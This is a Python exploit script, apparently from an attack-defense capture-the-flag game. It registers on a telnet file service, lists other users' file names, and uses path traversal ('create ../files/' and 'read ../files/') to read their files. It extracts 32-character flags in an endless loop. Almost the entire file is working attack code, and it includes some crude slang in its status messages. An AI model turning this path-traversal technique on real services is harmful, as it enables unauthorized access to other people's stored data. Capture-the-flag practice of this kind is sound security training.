#!/usr/bin/env python3

import random
import re
import string
import sys
import socket
import telnetlib
from time import sleep

PORT = 10081

class WaryTelnet(telnetlib.Telnet):
    def expect(self, list, timeout=None):
        n, match, data = super().expect(list, timeout)
        if n == -1:
            raise RuntimeError(f"no {list} in {data}")
        return n, match, data

    def expect_safe(self, list, timeout=None):
        n, match, data = super().expect(list, timeout)
        return n, match, data


def generate_rand(N=16):
    return "".join(random.choice(string.ascii_letters) for i in range(N))


def register(tn, username, password): #fixed
    try:
        tn.expect([b"Log in or sign up?"], 5)
        tn.write(b"s\n")
        tn.expect([b"login"], 5)
        tn.write(username.encode() + b"\n")
        tn.expect([b"password"], 5)
        tn.write(password.encode() + b"\n")
        tn.expect([b"confirm password"], 5)
        tn.write(password.encode() + b"\n")
        tn.expect([b"successfully"], 5)
        return True
    except Exception as e:
        return False


def authorize(tn, username, password): #fixed
    try:
        tn.expect([b"Log in or sign up?"], 5)
        tn.write(b"l\n")
        tn.expect([b"login"], 5)
        tn.write(username.encode() + b"\n")
        tn.expect([b"password"], 5)
        tn.write(password.encode() + b"\n")
        tn.expect([b"You've successfully loged in!"], 5)
        return True
    except Exception as e:
        return False


def diff(first, second):
        second = set(second)
        return [item for item in first if item not in second]


if __name__ == "__main__":
    tn = WaryTelnet("127.0.0.1", PORT, timeout=10)
    username = generate_rand(8)
    password = generate_rand(8)
    if not register(tn, username, password):
        print("nu i govno")
        exit()
    if not authorize(tn, username, password):
        print("nu i huita")
        exit()
    while(True):
        tn.write(b"sft\n")
        _,_,strin = tn.expect([b"]\n\nEnter your request"],5)
        names = strin.decode().split("', '")
        names[0] = names[0].split("['")[1]
        names[-1] = names[-1].split("'")[0]
        names = [filename for filename in names if len(filename)==16]
        #print(names)
        for name in names:
            tn.write(b"create ../files/" + name.encode() + b"\n")
            tn.expect([b"Enter a text for the file:"],5)
            tn.write(b"\n")
            idk = tn.read_until(b"\n\nEnter your request")
            idk = idk.decode()
            if "DONE!" not in idk:
                continue
            tn.write(b"read ../files/" + name.encode() + b"\n")
            _,_,pre_flag = tn.expect([b"____________________\n\nEnter your request"],5)
            pre_flag = pre_flag.decode()
            #print(pre_flag)
            flag = pre_flag.split("____________________\n")[1][:-1]
            if len(flag) == 32:
                print(f"here are flags: {flag}")
        print("i sleep, bro")
        sleep(10)